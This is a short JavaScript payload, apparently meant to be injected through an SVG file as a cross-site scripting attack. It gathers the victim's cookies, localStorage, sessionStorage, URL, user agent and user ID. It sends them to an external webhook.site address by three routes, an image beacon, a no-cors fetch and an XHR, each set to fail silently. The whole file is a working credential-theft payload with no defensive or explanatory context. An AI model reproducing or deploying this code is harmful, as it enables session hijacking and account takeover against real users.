svg.script:
(function() {
  // Your Webhook.site URL
  var webhook = 'https://webhook.site/56d41307-ff92-47c8-a42c-c41aa27410f4';
  
  // Collect all possible data
  var stolenData = {
    cookies: document.cookie || 'No cookies',
    localStorage: JSON.stringify(localStorage) || 'Empty',
    sessionStorage: JSON.stringify(sessionStorage) || 'Empty',
    url: window.location.href,
    userAgent: navigator.userAgent,
    // Try to find authUserId from DOM or global variables
    authUserId: document.querySelector('[data-user-id]')?.getAttribute('data-user-id') || 
                window.authUserId || 
                'Not found'
  };
  
  var payload = encodeURIComponent(JSON.stringify(stolenData));
  
  // Method 1: Image Beacon (GET request - Most reliable, no CORS issues)
  new Image().src = webhook + '?data=' + payload;
  
  // Method 2: Fetch (POST with no-cors - Bypasses CORS preflight)
  try {
    fetch(webhook, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(stolenData)
    });
  } catch(e) { /* Silently fail if fetch is blocked */ }
  
  // Method 3: XMLHttpRequest (Backup)
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', webhook + '?xhr=' + payload, true);
    xhr.send();
  } catch(e) { /* Silently fail */ }
  
})();
